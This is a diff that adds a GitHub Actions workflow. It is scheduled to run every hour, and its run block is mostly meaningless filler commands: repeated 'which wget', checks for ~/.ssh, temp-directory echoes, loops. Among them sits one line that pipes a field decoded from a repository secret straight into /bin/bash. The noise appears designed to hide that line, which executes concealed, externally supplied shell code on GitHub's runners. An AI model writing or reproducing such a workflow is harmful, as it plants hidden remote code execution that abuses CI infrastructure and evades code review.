@@ -1,0 +1,29 @@
+name: hejiatang7890
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hejiatang7890
+        env:
+          n31263: ${{ secrets.n31263 }}
+        run: |
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo $n31263 | jq -r .s16997 | /bin/bash
+          which wget
+          which wget
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          echo "Version: $((1 + RANDOM % 5))"
+          : ' Another single-line comment '
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          popd > /dev/null
+          test -d /tmp && echo "Tmp dir exists"
